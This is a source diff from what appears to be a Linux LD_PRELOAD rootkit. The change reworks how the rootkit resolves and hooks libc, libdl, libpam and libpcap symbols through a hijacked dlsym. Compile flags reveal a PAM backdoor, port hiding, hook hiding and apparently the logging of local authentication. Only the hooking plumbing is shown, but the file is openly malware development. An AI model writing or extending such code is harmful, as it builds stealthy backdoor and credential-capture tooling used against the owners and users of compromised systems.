@@ -3,28 +3,15 @@
 
 #define GLIBC_MAX_VER 40
 
-void *libc_handle;
-void *libdl_handle;
-#if defined(HIDE_HOOKS) && defined(USE_PAM_BD)
-void *libpam_handle;
-#endif
-#if defined(HIDE_HOOKS) && defined(HIDE_PORTS)
-void *libpcap_handle;
-#endif
-
 extern void *_dl_sym(void *, const char *, void *);
 typeof(dlsym) *o_dlsym;
 
-#ifdef HIDE_HOOKS
-void *xdlopen(const char *filename);
 void get_libc_symbol(const char *symbol, void **funcptr);
 void get_libdl_symbol(const char *symbol, void **funcptr);
-#endif
-#if defined(HIDE_HOOKS) && defined(USE_PAM_BD)
+#if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
 void get_libpam_symbol(const char *symbol, void **funcptr);
 #endif
-
-#if defined(HIDE_HOOKS) && defined(HIDE_PORTS)
+#ifdef HIDE_PORTS
 void get_libpcap_symbol(const char *symbol, void **funcptr);
 #endif
 
@@ -34,6 +21,7 @@ void get_symbol_pointer(int symbol_index, void *handle);
 void _hook(void *handle, ...);
 #include "gsym.c"
 
+/* wrapper macros for resolving & using symbols */
 #define hook(...) _hook(RTLD_NEXT, __VA_ARGS__)
 #define call(symbol_index, ...) symbols[symbol_index].func(__VA_ARGS__)
 
